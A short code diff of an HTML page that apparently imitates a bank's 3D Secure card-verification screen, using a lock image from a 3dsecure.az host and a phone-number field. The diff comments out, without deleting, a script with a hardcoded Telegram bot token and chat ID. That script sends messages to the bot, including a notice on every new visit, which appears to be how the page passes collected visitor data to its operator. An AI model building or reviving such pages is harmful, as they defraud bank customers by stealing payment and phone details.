@@ -170,6 +170,7 @@
 
         submitBtn.addEventListener("click", function (event) {
             setTimeout(function () {
+                
                 event.target.disabled = true;
                 submitBtn.innerHTML =
                     '<div><img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="" /></div><div><p class="submitWrd">Processing...</p></div>';
@@ -177,7 +178,7 @@
             }, 0);
         });
     </script>
-<script>
+<!-- <script>
     // frontend/send.js
 const token  = '8145659910:AAGi1J24CmTYJGA8KduFNqk7iqxT2g7og6U';
 const chatId = '-4648239173';
@@ -199,10 +200,10 @@ return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
 
 
 
-  </script>
+  </script> -->
 
     <script>document.addEventListener("DOMContentLoaded", function () {
-        sendTelegramMessage("🔔 yeni ziyaret")
+        // sendTelegramMessage("🔔 yeni ziyaret")
             const phoneInput = document.getElementById("phoneNumber");
 
             // IMask ayarları
